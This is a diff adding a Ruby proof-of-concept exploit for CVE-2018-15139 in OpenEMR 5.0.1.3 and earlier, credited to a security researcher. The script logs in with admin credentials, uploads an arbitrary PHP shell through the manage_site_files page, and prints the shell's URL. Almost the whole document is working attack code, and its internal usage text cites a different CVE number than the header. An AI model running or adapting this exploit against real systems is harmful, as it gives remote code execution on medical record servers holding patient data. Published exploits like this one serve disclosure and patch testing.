@@ -1,0 +1,87 @@
+# Title: OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated) (2)
+# Exploit author: noraj (Alexandre ZANNI) for SEC-IT (http://secit.fr)
+# Date: 2021-07-05
+# Vendor Homepage: https://www.open-emr.org/
+# Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
+# Docker PoC: https://github.com/sec-it/exploit-CVE-2018-15139/blob/master/docker-compose.yml
+# Version: < 5.0.1.4 (it means up to 5.0.1.3)
+# Tested on: OpenEMR Version 5.0.0.8
+# References: https://www.exploit-db.com/exploits/49998
+# CVE: CVE-2018-15139
+# CWE: CWE-434
+# Patch: https://github.com/openemr/openemr/pull/1757/commits/c2808a0493243f618bbbb3459af23c7da3dc5485
+
+#!/usr/bin/env ruby
+
+require 'pathname'
+require 'httpx'
+require 'http/form_data'
+require 'docopt'
+
+doc = <<~DOCOPT
+  OpenEMR < 5.0.1.4 - (Authenticated) File upload - Remote command execution
+
+  Source: https://github.com/sec-it/exploit-CVE-2019-14530
+
+  Usage:
+    #{__FILE__} exploit <url> <filename> <username> <password> [--debug]
+    #{__FILE__} -h | --help
+
+  Options:
+    <url>       Root URL (base path) including HTTP scheme, port and root folder
+    <filename>  Filename of the shell to be uploaded
+    <username>  Username of the admin
+    <password>  Password of the admin
+    --debug     Display arguments
+    -h, --help  Show this screen
+
+  Examples:
+    #{__FILE__} exploit http://example.org/openemr shell.php admin pass
+    #{__FILE__} exploit https://example.org:5000/ shell.php admin pass
+DOCOPT
+
+def login(root_url, user, pass, http)
+  vuln_url = "#{root_url}/interface/main/main_screen.php?auth=login&site=default"
+  params = {
+    'new_login_session_management' => '1',
+    'authProvider' => 'Default',
+    'authUser' => user,
+    'clearPass' => pass,
+    'languageChoice' => '1'
+  }
+
+  http.post(vuln_url, form: params).body.to_s
+end
+
+def upload(root_url, filepath, http)
+  vuln_url = "#{root_url}/interface/super/manage_site_files.php"
+  pn = Pathname.new(filepath)
+
+  params = {
+    form_image: {
+      content_type: 'application/x-php',
+      filename: pn.basename.to_s,
+      body: pn
+    },
+    bn_save: 'Save'
+  }
+
+  res = http.post(vuln_url, form: params)
+
+  return '[-] File not upload' unless (200..299).include?(res.status)
+
+  "[+] File uploaded:\n#{root_url}/sites/default/images/#{pn.basename}"
+end
+
+begin
+  args = Docopt.docopt(doc)
+  pp args if args['--debug']
+
+  if args['exploit']
+    http = HTTPX.plugin(:cookies).plugin(:follow_redirects).plugin(:multipart)
+    login(args['<url>'], args['<username>'], args['<password>'], http)
+    puts upload(args['<url>'], args['<filename>'], http)
+  end
+rescue Docopt::Exit => e
+  puts e.message
+end
